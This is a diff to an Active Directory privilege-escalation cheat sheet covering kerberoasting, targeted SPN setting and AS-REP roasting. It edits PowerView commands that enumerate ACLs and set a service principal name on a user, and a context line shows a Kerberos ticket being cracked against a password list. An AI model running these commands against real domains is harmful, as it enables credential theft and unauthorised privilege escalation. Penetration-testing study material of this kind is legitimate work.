@@ -1,7 +1,7 @@
 # Domain Privilege escalation
 * [Kerberoast](#Kerberoast) 
   * [Set SPN](#Set-SPN)
-* [AS-REP Roasting](#AS-REPS-Roasting) 
+* [AS-REP Roasting](#AS-REP-Roasting) 
 * [Set SPN](#Set-SPN) 
 * [Unconstrained Delegation](#Unconstrained-delegation) 
 * [Constrained Delegation](#Constrained-delegation) 
@@ -75,19 +75,20 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~
 - If we have sufficient permissions (GenericAll/GenericWrite). It is possible to set a SPN and then kerberoast!
 #### Enumerate permissions for group on ACL
 ```
-Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
-Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<SAMACCOUNTNAME>"}
 ```
 
 #### Set SPN for the user
+- Must be unique accross the forest. 
+- Format <STRING>/<STRING>
 ```
 . ./PowerView_dev.ps1
-Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’ops/whatever1’}
+Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’<ops/whatever1>’}
 ```
 
 #### Then Kerberoast user
 
-## AS-REPS Roasting
+## AS-REP Roasting
 #### Enumerating accounts with kerberos preauth disabled
 ```
 . .\Powerview_dev.ps1
